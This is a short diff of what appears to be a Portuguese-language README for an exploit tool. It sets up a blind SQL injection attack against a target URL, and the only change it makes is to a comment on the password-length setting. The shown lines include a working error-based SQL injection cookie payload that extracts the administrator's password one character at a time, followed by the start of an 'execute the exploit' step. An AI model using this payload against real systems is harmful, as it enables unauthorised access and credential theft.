@@ -29,7 +29,7 @@ url = "https://url.com"<br>
 max_requests = 1000 -- Valor limite da requisição no pool<br>
 status_check = 500 -- Status de retorno<br>
 cookie_template = "'||(SELECT CASE WHEN SUBSTR(password,$1,1)='$2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" -- SQLi<br>
-tamanho_senha = 20  # Defina o comprimento estimado da senha" -- Tamanho da senha. "
+tamanho_senha = 20  -- Defina o comprimento estimado da senha "
 
 3. **Execute o exploit:**
    ```bash
